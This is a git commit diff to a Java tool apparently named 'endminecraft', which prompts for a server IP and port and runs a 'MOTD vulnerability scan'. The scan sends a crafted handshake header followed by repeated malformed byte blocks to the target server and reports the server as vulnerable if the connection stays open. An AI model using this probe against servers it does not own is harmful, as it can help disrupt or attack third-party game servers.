09cc8eb8ece725d0dcdae3af5573d6741eeb3335
ALiKOMI <moe@alikomi.me>
2017-08-06 14:09:57 +0800

    qwq

--- src/main/java/me/alikomi/endminecraft/Main.java
+++ src/main/java/me/alikomi/endminecraft/Main.java
@@ -11,7 +11,6 @@ public class Main extends Util{
     public static int port;
 
     public static void main(String[] args) {
-        if (args == null) {
             Scanner sc = new Scanner(System.in);
             log("请输入ip地址");
             ip = sc.next();
@@ -21,7 +20,6 @@ public class Main extends Util{
             if ("y".equalsIgnoreCase(sc.next())) {
                 ScanBug.scanmotd(ip,port);
             }
-        }
     }
 
 }
--- src/main/java/me/alikomi/endminecraft/Tasks/ScanBug.java
+++ src/main/java/me/alikomi/endminecraft/Tasks/ScanBug.java
@@ -11,21 +11,25 @@ public class ScanBug extends Util {
         log("正在进行MOTD漏洞扫描，请等待");
         try {
             final Socket socket = new Socket();
+            log("正在连接...");
             socket.connect(new InetSocketAddress(ip, port));
+            if (socket.isConnected()) log("连接成功");
             final byte[] head = new byte[]{0x07, 0x00, 0x04, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01};
             if (socket.isConnected() && !socket.isClosed()) {
                 final OutputStream out = socket.getOutputStream();
                 out.write(head);
                 out.flush();
-                socket.close();
                 for (int i = 0; i < 10; i++) {
                     out.write(new byte[]{0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00});
                 }
                 out.flush();
-                Thread.sleep(800);
+                for (int i = 0; i < 10; i++) {
+                    out.write(new byte[]{0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00});
+                }
+                out.flush();
                 if (socket.isConnected() && !socket.isClosed()) {
                     log("发现MOTD漏洞");
-                }else {
+                } else {
                     log("无MOTD漏洞");
                 }
             }
